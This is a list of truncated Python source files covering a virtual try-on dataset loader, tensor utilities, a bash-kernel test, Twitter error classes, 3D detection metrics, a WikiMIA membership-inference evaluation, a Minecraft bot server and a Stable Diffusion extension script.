isinstance(img,torch.Tensor):\n        img = np.array(img)\n        if img.ndim == 3:\n            img = (img[0] if img.shape[0] == 1 else img.transpose(1,2,0))\n    unique_image = np.unique(img)\n    if 9 in unique_image:\n        color_label_map = [\n            [0,0,0],\n            [254,0,0],\n            [0,0,254],\n            [254,85,0],\n            [0, 127, 0],\n            [51,169,220],\n            [0,254,254],\n            [85, 254, 169],\n            [169, 254, 85],\n            [254, 254, 0],\n            [254, 169, 0],\n            [85, 85, 0],\n            [52, 86, 127],\n         ]\n    else:\n        color_label_map = [\n             [0,0,0],\n             [254,0,0],\n             [0,0,254],\n             [254,85,0],\n             [0,85,85],\n             [51,169,220],\n             [0,254,254],\n             [85, 254, 169],\n             [169, 254, 85],\n             [254, 254, 0],\n             [254, 169, 0],\n             [85, 85, 0],\n             [52, 86, 127],\n        ]\n    rgb = remap_colors(img, color_label_map)\n    return rgb\n\ndef get_unique_rgb_values(img):\n    if isinstance(img,torch.Tensor):\n        img = np.array(img).transpose(1,2,0)\n    img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n    reshaped_img = img_rgb.reshape(-1, img_rgb.shape[-1])\n    unique_rgb_values = np.unique(reshaped_img, axis=0)\n\n    return unique_rgb_values\n\nclass VITONDataset(data.Dataset):\n    def __init__(self, opt):\n        super(VITONDataset, self).__init__()\n        self.load_height = opt.load_height\n        self.load_width = opt.load_width\n        self.semantic_nc = opt.semantic_nc\n        self.data_path = osp.join(opt.dataset_dir, opt.dataset_mode)\n        self.transform = transforms.Compose([\n            transforms.ToTensor(),\n            transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))\n        ])\n        self.dataset_mode = opt.dataset_mode\n        self.warp_cloth_list = opt.warp_cloth_list\n        # load data list\n        img_names = []\n        c_names = []\n        self.dataset_list = opt.dataset_list\n        self.paired = opt.paired\n        with open(osp.join(opt.dataset_dir, opt.dataset_list), 'r') as f:\n            for line in f.readlines():\n                try:\n                    img_name, c_name, _ = line.strip().split()\n                except:\n                    img_name, c_name = line.strip().split()\n                img_names.append(img_name)\n                c_names.append(c_name)\n\n        self.img_names = img_names\n        self.c_names = dict()\n        if self.paired == 'paired':\n            self.c_names['unpaired'] = img_names\n        else:\n            self.c_names['unpaired'] = c_names\n\n    def get_parse_agnostic(self, parse, pose_data):\n        parse_array = np.array(parse)\n        parse_upper = ((parse_array == 5).astype(np.float32) +\n                       (parse_array == 6).astype(np.float32) +\n                       (parse_array == 7).astype(np.float32))\n        parse_neck = (parse_array == 10).astype(np.float32)\n\n        r = 10\n        agnostic = parse.copy()\n\n        # mask arms\n        for parse_id, pose_ids in [(14, [2, 5, 6, 7]), (15, [5, 2, 3, 4])]:\n            mask_arm = Image.new('L', (self.load_width, self.load_height), 'black')\n            mask_arm_draw = ImageDraw.Draw(mask_arm)\n            i_prev = pose_ids[0]\n            for i in pose_ids[1:]:\n                if (pose_data[i_prev, 0] == 0.0 and pose_data[i_prev, 1] == 0.0) or (pose_data[i,",
    "\"\"\"\nThis file may have been modified by Bytedance Ltd. and/or its affiliates (\u201cBytedance's Modifications\u201d).\nAll Bytedance's Modifications are Copyright (year) Bytedance Ltd. and/or its affiliates. \n\nReference: https://github.com/facebookresearch/Mask2Former/blob/main/mask2former/utils/misc.py\n\nMisc functions, including distributed helpers.\n\nMostly copy-paste from torchvision references.\n\"\"\"\nfrom typing import List, Optional\n\nimport torch\nimport torch.distributed as dist\nimport torchvision\nfrom torch import Tensor\n\n\ndef _max_by_axis(the_list):\n    # type: (List[List[int]]) -> List[int]\n    maxes = the_list[0]\n    for sublist in the_list[1:]:\n        for index, item in enumerate(sublist):\n            maxes[index] = max(maxes[index], item)\n    return maxes\n\n\nclass NestedTensor(object):\n    def __init__(self, tensors, mask: Optional[Tensor]):\n        self.tensors = tensors\n        self.mask = mask\n\n    def to(self, device):\n        # type: (Device) -> NestedTensor # noqa\n        cast_tensor = self.tensors.to(device)\n        mask = self.mask\n        if mask is not None:\n            assert mask is not None\n            cast_mask = mask.to(device)\n        else:\n            cast_mask = None\n        return NestedTensor(cast_tensor, cast_mask)\n\n    def decompose(self):\n        return self.tensors, self.mask\n\n    def __repr__(self):\n        return str(self.tensors)\n\n\ndef nested_tensor_from_tensor_list(tensor_list: List[Tensor]):\n    # TODO make this more general\n    if tensor_list[0].ndim == 3:\n        if torchvision._is_tracing():\n            # nested_tensor_from_tensor_list() does not export well to ONNX\n            # call _onnx_nested_tensor_from_tensor_list() instead\n            return _onnx_nested_tensor_from_tensor_list(tensor_list)\n\n        # TODO make it support different-sized images\n        max_size = _max_by_axis([list(img.shape) for img in tensor_list])\n        # min_size = tuple(min(s) for s in zip(*[img.shape for img in tensor_list]))\n        batch_shape = [len(tensor_list)] + max_size\n        b, c, h, w = batch_shape\n        dtype = tensor_list[0].dtype\n        device = tensor_list[0].device\n        tensor = torch.zeros(batch_shape, dtype=dtype, device=device)\n        mask = torch.ones((b, h, w), dtype=torch.bool, device=device)\n        for img, pad_img, m in zip(tensor_list, tensor, mask):\n            pad_img[: img.shape[0], : img.shape[1], : img.shape[2]].copy_(img)\n            m[: img.shape[1], : img.shape[2]] = False\n    else:\n        raise ValueError(\"not supported\")\n    return NestedTensor(tensor, mask)\n\n\n# _onnx_nested_tensor_from_tensor_list() is an implementation of\n# nested_tensor_from_tensor_list() that is supported by ONNX tracing.\n@torch.jit.unused\ndef _onnx_nested_tensor_from_tensor_list(tensor_list: List[Tensor]) -> NestedTensor:\n    max_size = []\n    for i in range(tensor_list[0].dim()):\n        max_size_i = torch.max(\n            torch.stack([img.shape[i] for img in tensor_list]).to(torch.float32)\n        ).to(torch.int64)\n        max_size.append(max_size_i)\n    max_size = tuple(max_size)\n\n    # work around for\n    # pad_img[: img.shape[0], : img.shape[1], : img.shape[2]].copy_(img)\n    # m[: img.shape[1], :img.shape[2]] = False\n    # which is not yet supported in onnx\n    padded_imgs = []\n    padded_masks = []\n    for img in tensor_list:\n        padding = [(s1 - s2) for s1, s2 in zip(max_size, tuple(img.shape))]\n        padded_img = torch.nn.functional.pad(img, (0, padding[2], 0, padding[1], 0, padding[0]))\n        padded_imgs.append(padded_img)\n\n        m = torch.zeros_like(img[0], dtype=torch.int, device=img.device)\n        padded_mask = torch.nn.functional.pad(m, (0, padding[2], 0, padding[1]), \"constant\", 1)\n        padded_masks.append(padded_mask.to(torch.bool))\n\n    tensor = torch.stack(padded_imgs)\n    mask = torch.stack(padded_masks)\n\n    return NestedTensor(tensor, mask=mask)\n\n\ndef is_dist_avail_and_initialized():\n    if not dist.is_available():\n        return False\n    if not dist.is_initialized():\n        return False\n    return True\n",
    "\"\"\"Reference: https://github.com/Calysto/calysto_bash/blob/dfa6833187e1fe9d9c229fd7bcc839fd7813d74b/test_bash_kernel.py\"\"\"\n# ruff: noqa: RUF012\n\nimport unittest\n\nimport jupyter_kernel_test as jkt\n\n\nclass BashKernelTests(jkt.KernelTests):\n    # the kernel to be tested\n    # this is the normally the name of the directory containing the\n    # kernel.json file - you should be able to do\n    # `jupyter console --kernel KERNEL_NAME`\n    kernel_name = \"pixi-kernel-bash\"\n\n    # Everything else is OPTIONAL\n\n    # the name of the language the kernel executes\n    # checked against language_info.name in kernel_info_reply\n    language_name = \"bash\"\n\n    # the normal file extension (including the leading dot) for this language\n    # checked against language_info.file_extension in kernel_info_reply\n    file_extension = \".sh\"\n\n    code_hello_world = \"echo 'hello, world'\"\n\n    completion_samples = [\n        {\n            \"text\": \"fdis\",\n            \"matches\": {\"fdisk\"},\n        },\n    ]\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "class TwitterError(Exception):\n    \"\"\"Base class for Twitter errors\"\"\"\n\n    def __init__(self, error_dict: dict):\n        self.error_dict = error_dict\n\n    @property\n    def error_message(self) -> str:\n        if self.error_code == 32:\n            return \"Failed to authenticate account. Check your credentials.\"\n\n        elif self.error_code == 36:\n            return \"You cannot use your own user ID to report spam call\"\n\n        elif self.error_code == 38:\n            return \"The request is missing the <named> parameter (such as media, text, etc.) in the request.\"\n\n        elif self.error_code == 50:\n            return \"User not found.\"\n\n        elif self.error_code == 89:\n            return \"The access token used in the request is incorrect or has expired.\"\n\n        elif self.error_code == 92:\n            return \"SSL is required. Only TLS v1.2 connections are allowed in the API. Update the request to a secure connection.\"\n\n        elif self.error_code == 139:\n            return \"You have already favorited this tweet. (Duplicate)\"\n\n        elif self.error_code == 160:\n            return \"You've already requested to follow the user. (Duplicate)\"\n\n        elif self.error_code == 186:\n            return \"Tweet needs to be a bit shorter. The text is too long.\"\n\n        elif self.error_code == 187:\n            return \"Text of your tweet is identical to another tweet. Change your text. (Duplicate)\"\n\n        elif self.error_code == 205:\n            return \"The account limit for reporting spam has been reached. Try again later.\"\n\n        elif self.error_code == 214:\n            return \"Account is not set up to have open Direct Messages when trying to set up a welcome message.\"\n\n        elif self.error_code == 220:\n            return \"The authentication token in use is restricted and cannot access the requested resource.\"\n\n        elif self.error_code == 323:\n            return \"Only one animated GIF may be attached to a single Post.\"\n\n        elif self.error_code == 325:\n            return \"The media ID attached to the Post was not found.\"\n\n        elif self.error_code == 327:\n            return \"You cannot repost the same Post more than once.\"\n\n        elif self.error_code == 349:\n            return \"You does not have privileges to Direct Message the recipient.\"\n\n        return self.error_dict.get(\"error_message\")\n\n    @property\n    def error_code(self) -> int:\n        return self.error_dict.get(\"error_code\")\n\n\nclass TwitterAccountSuspended(Exception):\n    \"\"\"Raised when account is suspended\"\"\"\n\n    pass\n\n\nclass CaptchaError(Exception):\n    \"\"\"Raised when captcha solving failed\"\"\"\n\n    pass\n\n\nclass RateLimitError(Exception):\n    \"\"\"Raised when rate limit exceeded\"\"\"\n\n    pass\n\n\nclass IncorrectData(Exception):\n    \"\"\"Raised when validation error\"\"\"\n\n    pass\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\n\"\"\" Utility functions for metric evaluation.\n\nAuthor: Or Litany and Charles R. Qi\n\"\"\"\n\nimport os\nimport sys\nimport torch\n\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nsys.path.append(BASE_DIR)\n\nimport numpy as np\n\n# Mesh IO\nimport trimesh\n\n\n# ----------------------------------------\n# Precision and Recall\n# ----------------------------------------\n\n\ndef multi_scene_precision_recall(\n    labels, pred, iou_thresh, conf_thresh, label_mask, pred_mask=None\n):\n    \"\"\"\n    Args:\n        labels: (B, N, 6)\n        pred: (B, M, 6)\n        iou_thresh: scalar\n        conf_thresh: scalar\n        label_mask: (B, N,) with values in 0 or 1 to indicate which GT boxes to consider.\n        pred_mask: (B, M,) with values in 0 or 1 to indicate which PRED boxes to consider.\n    Returns:\n        TP,FP,FN,Precision,Recall\n    \"\"\"\n    # Make sure the masks are not Torch tensor, otherwise the mask==1 returns uint8 array instead\n    # of True/False array as in numpy\n    assert not torch.is_tensor(label_mask)\n    assert not torch.is_tensor(pred_mask)\n    TP, FP, FN = 0, 0, 0\n    if label_mask is None:\n        label_mask = np.ones((labels.shape[0], labels.shape[1]))\n    if pred_mask is None:\n        pred_mask = np.ones((pred.shape[0], pred.shape[1]))\n    for batch_idx in range(labels.shape[0]):\n        TP_i, FP_i, FN_i = single_scene_precision_recall(\n            labels[batch_idx, label_mask[batch_idx, :] == 1, :],\n            pred[batch_idx, pred_mask[batch_idx, :] == 1, :],\n            iou_thresh,\n            conf_thresh,\n        )\n        TP += TP_i\n        FP += FP_i\n        FN += FN_i\n\n    return TP, FP, FN, precision_recall(TP, FP, FN)\n\n\ndef single_scene_precision_recall(labels, pred, iou_thresh, conf_thresh):\n    \"\"\"Compute P and R for predicted bounding boxes. Ignores classes!\n    Args:\n        labels: (N x bbox) ground-truth bounding boxes (6 dims)\n        pred: (M x (bbox + conf)) predicted bboxes with confidence and maybe classification\n    Returns:\n        TP, FP, FN\n    \"\"\"\n\n    # for each pred box with high conf (C), compute IoU with all gt boxes.\n    # TP = number of times IoU > th ; FP = C - TP\n    # FN - number of scene objects without good match\n\n    gt_bboxes = labels[:, :6]\n\n    num_scene_bboxes = gt_bboxes.shape[0]\n    conf = pred[:, 6]\n\n    conf_pred_bbox = pred[np.where(conf > conf_thresh)[0], :6]\n    num_conf_pred_bboxes = conf_pred_bbox.shape[0]\n\n    # init an array to keep iou between generated and scene bboxes\n    iou_arr = np.zeros([num_conf_pred_bboxes, num_scene_bboxes])\n    for g_idx in range(num_conf_pred_bboxes):\n        for s_idx in range(num_scene_bboxes):\n            iou_arr[g_idx, s_idx] = calc_iou(\n                conf_pred_bbox[g_idx, :], gt_bboxes[s_idx, :]\n            )\n\n    good_match_arr = iou_arr >= iou_thresh\n\n    TP = good_match_arr.any(axis=1).sum()\n    FP = num_conf_pred_bboxes - TP\n    FN = num_scene_bboxes - good_match_arr.any(axis=0).sum()\n\n    return TP, FP, FN\n\n\ndef precision_recall(TP, FP, FN):\n    Prec = 1.0 * TP / (TP + FP) if TP + FP > 0 else 0\n    Rec = 1.0 * TP / (TP + FN)\n    return Prec, Rec\n\n\ndef calc_iou(box_a, box_b):\n    \"\"\"Computes IoU of two axis aligned bboxes.\n    Args:\n        box_a, box_b: 6D of center and lengths\n    Returns:\n        iou\n    \"\"\"\n\n    max_a = box_a[0:3] + box_a[3:6] / 2\n    max_b = box_b[0:3] + box_b[3:6] / 2\n    min_max = np.array([max_a, max_b]).min(0)\n\n    min_a = box_a[0:3] - box_a[3:6] / 2\n    min_b = box_b[0:3] - box_b[3:6] / 2\n    max_min = np.array([min_a, min_b]).max(0)\n    if not ((min_max > max_min).all()):\n        return 0.0\n\n    intersection = (min_max - max_min).prod()\n    vol_a = box_a[3:6].prod()\n    vol_b = box_b[3:6].prod()\n    union = vol_a + vol_b - intersection\n    return 1.0 * intersection / union\n\n\nif __name__ == \"__main__\":\n    print(\"running some tests\")\n\n    ############\n    ## Test IoU\n    ############\n    box_a = np.array([0, 0, 0, 1, 1, 1])\n    box_b = np.array([0, 0, 0, 2, 2, 2])\n    expected_iou = 1.0 / 8\n    pred_iou = calc_iou(box_a, box_b)\n    assert expected_iou == pred_iou, \"function returned wrong IoU\"\n\n    box_a = np.array([0, 0, 0, 1, 1, 1])\n    box_b = np.array([10, 10, 10, 2, 2, 2])\n    expected_iou = 0.0\n    pred_iou = calc_iou(box_a, box_b)\n    assert expected_iou == pred_iou, \"function returned wrong IoU\"\n\n    print(\"IoU test -- PASSED\")\n\n    #########################\n    ## Test Precition Recall\n    #########################\n    gt_boxes = np.array([[0, 0, 0, 1, 1, 1], [3, 0, 1, 1, 10, 1]])\n    detected_boxes = np.array(\n        [[0, 0, 0, 1, 1, 1, 1.0], [3, 0, 1, 1, 10, 1, 0.9]]\n    )\n    TP, FP, FN = single_scene_precision_recall(\n        gt_boxes, detected_boxes, 0.5, 0.5\n    )\n    assert TP == 2 and FP == 0 and FN == 0\n    assert precision_recall(TP, FP, FN) == (1, 1)\n\n    detected_boxes = np.array([[0, 0, 0, 1, 1, 1,",
    "import os, argparse\nfrom collections import defaultdict\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import roc_curve, auc\nfrom tqdm import tqdm\nimport zlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nfrom datasets import load_dataset\n\n\n# helper functions\ndef convert_huggingface_data_to_list_dic(dataset):\n    all_data = []\n    for i in range(len(dataset)):\n        ex = dataset[i]\n        all_data.append(ex)\n    return all_data\n\n# arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('--model', type=str, default='EleutherAI/pythia-2.8b')\nparser.add_argument(\n    '--dataset', type=str, default='WikiMIA_length32', \n    choices=[\n        'WikiMIA_length32', 'WikiMIA_length64', 'WikiMIA_length128',\n        'WikiMIA_length32_paraphrased',\n        'WikiMIA_length64_paraphrased',\n        'WikiMIA_length128_paraphrased', \n    ]\n)\nparser.add_argument('--half', action='store_true')\nparser.add_argument('--int8', action='store_true')\nargs = parser.parse_args()\n\n# load model\ndef load_model(name, ref=False):\n    int8_kwargs = {}\n    half_kwargs = {}\n    # ref model is small and will be loaded in full precision\n    if args.int8 and not ref:\n        int8_kwargs = dict(load_in_8bit=True, torch_dtype=torch.bfloat16)\n    elif args.half and not ref:\n        half_kwargs = dict(torch_dtype=torch.bfloat16)\n    \n    if 'mamba' in name:\n        try:\n            from transformers import MambaForCausalLM\n        except ImportError:\n            raise ImportError\n        model = MambaForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )        \n    else:\n        model = AutoModelForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )\n    model.eval()\n    tokenizer = AutoTokenizer.from_pretrained(name)\n    return model, tokenizer\n\n# hard-coded ref model\nif 'pythia' in args.model:\n    args.ref_model = 'EleutherAI/pythia-70m'\nelif 'llama' in args.model:\n    args.ref_model = 'huggyllama/llama-7b'\nelif 'gpt-neox-20b' in args.model:\n    args.ref_model = 'EleutherAI/gpt-neo-125m'\nelif 'mamba' in args.model:\n    args.ref_model = 'state-spaces/mamba-130m-hf'\nelif 'opt' in args.model:\n    args.ref_model = 'facebook/opt-350m'\nelse:\n    raise NotImplementedError\n\nmodel, tokenizer = load_model(args.model)\nref_model, ref_tokenizer = load_model(args.ref_model, ref=True)\n\n# load dataset\nif not 'paraphrased' in args.dataset:\n    dataset = load_dataset('swj0419/WikiMIA', split=args.dataset)\nelse:\n    dataset = load_dataset('zjysteven/WikiMIA_paraphrased_perturbed', split=args.dataset)\ndata = convert_huggingface_data_to_list_dic(dataset)\n\n# inference - get scores for each input\ndef inference(text, model):\n    input_ids = torch.tensor(tokenizer.encode(text)).unsqueeze(0)\n    input_ids = input_ids.to(model.device)\n    with torch.no_grad():\n        outputs = model(input_ids, labels=input_ids)\n    loss, logits = outputs[:2]\n    ll = -loss.item() # log-likelihood\n    return ll\n\nscores = defaultdict(list)\nfor i, d in enumerate(tqdm(data, total=len(data), desc='Samples')): \n    text = d['input']\n    \n    ll = inference(text, model)\n    ll_ref = inference(text, ref_model)\n    ll_lowercase = inference(text.lower(), model)\n\n    # assuming the score is larger for training data\n    # and smaller for non-training data\n    # this is why sometimes there is a negative sign in front of the score\n    scores['ref'].append(ll - ll_ref)\n    scores['lowercase'].append(ll_lowercase / ll)\n\n# compute metrics\n# tpr and fpr thresholds are hard-coded\ndef get_metrics(scores, labels):\n    fpr_list, tpr_list, thresholds = roc_curve(labels, scores)\n    auroc = auc(fpr_list, tpr_list)\n    fpr95 = fpr_list[np.where(tpr_list >= 0.95)[0][0]]\n    tpr05 = tpr_list[np.where(fpr_list <= 0.05)[0][-1]]\n    return auroc, fpr95, tpr05\n\nlabels = [d['label'] for d in data] # 1: training, 0: non-training\nresults = defaultdict(list)\nfor method, scores in scores.items():\n    auroc, fpr95, tpr05 = get_metrics(scores, labels)\n    \n    results['method'].append(method)\n    results['auroc'].append(f\"{auroc:.1%}\")\n    results['fpr95'].append(f\"{fpr95:.1%}\")\n    results['tpr05'].append(f\"{tpr05:.1%}\")\n\ndf = pd.DataFrame(results)\nprint(df)\n\nsave_root = f\"results/{args.dataset}\"\nif not os.path.exists(save_root):\n    os.makedirs(save_root)\n\nmodel_id = args.model.split('/')[-1]\nif os.path.isfile(os.path.join(save_root, f\"{model_id}.csv\")):\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False, mode='a', header=False)\nelse:\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False)",
    "import argparse\nimport time\nfrom math import floor\nimport names\nfrom flask import Flask, request, jsonify\nfrom random import randint, choice\nfrom env_api import *\nfrom functools import wraps\n\n# sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf8')\nos.environ[\"REQ_TIMEOUT\"] = \"1800000\"\napp = Flask(__name__)\nmsg_list = []  # \u7528\u4e8e\u5b58\u50a8\u6d88\u606f\u961f\u5217\uff0c\u6bcf\u6b21\u83b7\u53d6\u540e\u6e05\u9664\u5f53\u524d\u7684\u6d88\u606f\u961f\u5217\n# Pickable = False\n\nparser = argparse.ArgumentParser()\nparser.add_argument('-P', '--port', type=int, default=25565)\nparser.add_argument('-H', '--host', type=str, default='10.21.31.18')\nparser.add_argument('-U', '--username', type=str, default=names.get_full_name().replace(' ', '_'))\nparser.add_argument('-W', '--worldname', type=str)\nparser.add_argument('-LP', '--local_port', type=int, default=5000)\nparser.add_argument('-D', '--debug', type=bool, default=False)\nargs = parser.parse_args()\nlocal_port = args.local_port\nprint(f\"Agent {args.username} login {args.worldname} at {args.host}:{args.port}\")\n# VIEW_PORT = 3000\nmineflayer = require('mineflayer')\npathfinder = require('mineflayer-pathfinder')\ncollectBlock = require('mineflayer-collectblock')\npvp = require(\"mineflayer-pvp\").plugin\nminecraftHawkEye = require(\"minecrafthawkeye\")\nVec3 = require(\"vec3\")\n# viewer = require('prismarine-viewer').mineflayer\nSocks = require(\"socks5-client\")\nminecraftData = require('minecraft-data')\nmcData = minecraftData('1.19.2')\n# print(mcData.itemsByName['yellow_carpet'])\nbot = mineflayer.createBot({\n    \"host\": args.host,\n    \"port\": args.port,\n    'username': args.username.replace(' ', '_'),\n    'checkTimeoutInterval': 600000,\n    'auth': 'offline',\n    'version': '1.19.2',\n})\nbot.loadPlugin(pathfinder.pathfinder)\nbot.loadPlugin(collectBlock.plugin)\nbot.loadPlugin(pvp)\nbot.loadPlugin(minecraftHawkEye)\n\nVISIBLE_ONLY = True # \u662f\u5426\u53ea\u770b\u5230\u53ef\u89c1\u7684\u65b9\u5757 | False: \u5f00\u91d1\u624b\u6307\n\n# \u5b9a\u4e49\u4fee\u9970\u5668\ndef log_activity(bot):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            # \u5728\u51fd\u6570\u6267\u884c\u524d\u6253\u5370\n            # bot.chat(f\"{bot.username} is going to do task: {func.__name__}\")\n            try:\n                # \u6267\u884c\u51fd\u6570\n                result = func(*args, **kwargs) # \u8fd9\u91cc\u53ef\u4ee5\u589e\u52a0\u66f4\u591a\u7684\u53cd\u9988\u4fe1\u606f\n                # \u5728\u51fd\u6570\u6267\u884c\u540e\u6253\u5370(\\1\\n@log)\n                # bot.chat(f\"{bot.username} has done task: {func.__name__}\")\n                return result\n            except Exception as e:\n                # \u5982\u679c\u53d1\u751f\u5f02\u5e38\uff0c\u6253\u5370\u5f02\u5e38\u4fe1\u606f\n                # bot.chat(f\"{bot.username} Error in task: {func.__name__} - {str(e)}\")\n                raise e\n        return wrapper\n    return decorator\n\n@app.route('/hello', methods=['GET'])\n@log_activity(bot)\ndef hello_world():\n    return 'Hello World!'\n\n\n@app.route('/post_render', methods=['POST'])\n@log_activity(bot)\ndef render_structure():\n    \"\"\"render_structure: render the structure.\"\"\"\n    data = request.get_json()\n    id = data.get('id')\n    center_pos = data.get('center_pos')\n    try:\n        with open(\"../minecraft/building_blue_print.json\", \"r\") as f:\n            structure_list = json.load(f)\n        structure = structure_list[id]\n        for b in structure[\"blocks\"]:\n            time.sleep(.05)\n            x, y, z = b[\"position\"][0] + center_pos[0], b[\"position\"][1] + center_pos[1], b[\"position\"][2] + center_pos[2]\n            if b[\"facing\"] in [\"W\", \"E\", \"S\", \"N\"]:\n                cvt = {\"W\": \"west\", \"E\": \"east\", \"S\": \"south\", \"N\": \"north\"}\n                bot.chat(f'/setblock {x} {y} {z} {b[\"name\"]}[facing={cvt[b[\"facing\"]]}]')\n            elif b[\"facing\"] in [\"x\", \"y\", \"z\"]:\n                bot.chat(f'/setblock {x} {y} {z} {b[\"name\"]}[axis={b[\"facing\"]}]')\n            elif b[\"facing\"] == \"A\":\n                bot.chat(f'/setblock {x} {y} {z} {b[\"name\"]}')\n\n\n    except Exception as e:\n        return jsonify({'message': str(e), 'status': False})\n    \n    return jsonify({'message': \"render success\", 'status': True})\n\n@app.route('/post_msg', methods=['POST'])\n@log_activity(bot)  # \u83b7\u53d6\u524d\u7aef\u53d1\u6765\u7684\u6d88\u606f\ndef get_msg():\n    \"\"\"get_msg: get the message from the message queue.\"\"\"\n    global msg_list\n    msg = msg_list\n    msg_list = []\n    return jsonify({'message': msg, 'status': True})\n\n\n@app.route('/post_time', methods=['POST'])\n@log_activity(bot)  # \u83b7\u53d6\u524d\u7aef\u7684\u65f6\u95f4\ndef get_time():\n    return jsonify({'time': str(bot.time.timeOfDay)})\n\n@app.route('/post_lay', methods=['POST'])\n@log_activity(bot)\ndef lay_():\n    \"\"\"lay: lay the block.\"\"\"\n    data = request.get_json()\n    x_1, y_1, z_1, x_2, y_2, z_2 = data.get('x_1'), data.get('y_1'), data.get('z_1'), data.get('x_2'), data.get('y_2'), data.get('z_2')\n    need = (abs(x_1 - x_2) + 1) * (abs(y_1 - y_2) + 1) * (abs(z_1 - z_2) + 1)\n    tag, msg = move_to(pathfinder, bot, Vec3, 3, Vec3(x_1, y_1, z_1))\n    if not tag:\n        return jsonify({'message': msg, 'status': False})\n    tag, msg = move_to(pathfinder, bot, Vec3, 3, Vec3(x_2, y_2, z_2))\n    if not tag:\n        return jsonify({'message': msg, 'status': False})\n    \n    if countInventoryItems(bot, 'dirt')[1] < need:\n        return jsonify({'message': f\"Don't have enough dirt in inventory, have {countInventoryItems(bot, ",
    "import copy\r\nfrom contextlib import closing\r\nimport json\r\nfrom PIL import Image\r\nfrom modules import shared, scripts_postprocessing, scripts, sd_models\r\nfrom modules.processing import Processed, StableDiffusionProcessingImg2Img, process_images\r\n\r\nfrom old_sd_firstpasser.tools import (\r\n    limiSizeByOneDemention, getJobsCountImg2Img, getTotalStepsImg2Img, removeAllNetworksWithErrorsWarnings, NAME,\r\n    getSecondPassBeginFromImg2Img, quote_swap, get_model_short_title,\r\n)\r\nfrom old_sd_firstpasser.ui import makeUI\r\nif hasattr(scripts_postprocessing.ScriptPostprocessing, 'process_firstpass'):  # webui >= 1.7\r\n    from modules.ui_components import InputAccordion\r\nelse:\r\n    InputAccordion = None\r\n\r\n\r\n\r\nclass ScriptSelectable(scripts.Script):\r\n    def __init__(self):\r\n        self.scriptsImages = []\r\n        self.scriptsInfotexts = []\r\n        self.originalUpscaler = None\r\n        self.firstpass_upscaler = None\r\n        self.total_tqdm_total = None\r\n        self.total_tqdm_second_pass_begin_from = 0\r\n\r\n    def title(self):\r\n        return NAME\r\n\r\n    def show(self, is_img2img):\r\n        return is_img2img\r\n\r\n    def ui(self, is_img2img):\r\n        ui = makeUI(self)\r\n        return ui\r\n\r\n\r\n    def run(self, originalP: StableDiffusionProcessingImg2Img, firstpass_steps, firstpass_denoising, firstpass_upscaler, sd_1_checkpoint):\r\n        oringinalCheckpoint = shared.opts.sd_model_checkpoint if not 'sd_model_checkpoint' in originalP.override_settings else originalP.override_settings['sd_model_checkpoint']\r\n        self.originalUpscaler = shared.opts.upscaler_for_img2img\r\n        try:\r\n            shared.state.textinfo = \"switching sd checkpoint\"\r\n            shared.opts.sd_model_checkpoint = sd_1_checkpoint\r\n            sd_models.reload_model_weights()\r\n\r\n            originalP.do_not_save_grid = True\r\n\r\n            originalP.extra_generation_params['Script'] = NAME\r\n            originalP.extra_generation_params[NAME] = json.dumps({\r\n                'steps': firstpass_steps,\r\n                'denoising': firstpass_denoising,\r\n                'upscaler': firstpass_upscaler,\r\n                'model': get_model_short_title(sd_1_checkpoint),\r\n            }).translate(quote_swap)\r\n\r\n            img2imgP = copy.copy(originalP)\r\n            img2imgP.width, img2imgP.height = limiSizeByOneDemention((originalP.width, originalP.height), 512)\r\n            img2imgP.steps = firstpass_steps\r\n            img2imgP.batch_size = 1\r\n            img2imgP.n_iter = 1\r\n            img2imgP.override_settings['sd_vae'] = 'Automatic'\r\n\r\n            if not originalP.init_images or not all(originalP.init_images): # txt2img equivalent\r\n                dummy_image = Image.new('RGB', (originalP.width, originalP.height))\r\n                img2imgP.init_images = [dummy_image]\r\n                img2imgP.image_mask = Image.new('L', (img2imgP.width, img2imgP.height), 255)\r\n                img2imgP.inpaint_full_res = False\r\n                img2imgP.inpainting_fill = 2 # latent noise\r\n                img2imgP.denoising_strength = 1.0\r\n                originalP.denoising_strength = 1.0\r\n            shared.state.job_count = getJobsCountImg2Img(originalP)\r\n            self.total_tqdm_total = getTotalStepsImg2Img(originalP, firstpass_steps, firstpass_denoising)\r\n            self.total_tqdm_second_pass_begin_from = getSecondPassBeginFromImg2Img(originalP, firstpass_steps)\r\n            shared.total_tqdm.updateTotal(self.total_tqdm_total)\r\n\r\n            with closing(img2imgP):\r\n                img2imgP.old_sd_firstpasser_prevent_recursion = True\r\n                shared.state.textinfo = \"firstpassing with sd 1.x\"\r\n                processed1: Processed = process_images(img2imgP)\r\n            # throwning away all extra images e.g. controlnet preprocessed\r\n            n = len(processed1.all_seeds)\r\n            self.scriptsImages = processed1.images[n:]\r\n            self.scriptsInfotexts = processed1.infotexts[n:]\r\n            originalP.init_images = processed1.images[:n]\r\n            originalP.denoising_strength = firstpass_denoising\r\n            originalP.seed = processed1.all_seeds[0]\r\n            originalP.subseed = processed1.all_subseeds[0]\r\n        finally:\r\n            shared.state.textinfo = \"switching sd checkpoint\"\r\n            shared.opts.sd_model_checkpoint = oringinalCheckpoint\r\n            sd_models.reload_model_weights()\r\n            shared.state.textinfo = \"generating\"\r\n            self.firstpass_upscaler = firstpass_upscaler\r\n            originalP.selectable_old_sd_firstpasser_script = self\r\n\r\n\r\n\r\n\r\nclass ScriptBackground(scripts.Script):\r\n    def title(self):\r\n        return NAME + \" background\"\r\n\r\n    def show(self, is_img2img):\r\n        return scripts.AlwaysVisible if is_img2img else False\r\n\r\n    def ui(self, is_img2img):\r\n        return []\r\n\r\n    def 